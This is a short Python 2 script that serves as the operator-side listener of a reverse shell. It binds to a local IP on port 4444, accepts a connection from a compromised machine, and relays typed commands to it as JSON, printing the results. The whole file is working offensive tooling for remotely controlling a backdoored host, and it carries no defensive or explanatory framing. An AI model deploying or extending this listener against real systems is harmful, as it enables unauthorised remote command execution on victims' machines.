#!/usr/bin/python

import socket, json

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))

    def execute_remotely(self, command):
        # self.connection.send(command)
        # return self.connection.recv(1024)
        self.reliable_send(command)
        return self.reliable_recieve()

    def run(self):
        while True:
            command = raw_input(">> ") # raw_input for python2
            result = self.execute_remotely(command)
            print(result)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_recieve(self):
        json_data = self.connection.recv(1024) # unwrapping
        return json.loads(json_data)

my_listener = Listener("192.168.2.106", 4444)
my_listener.run()
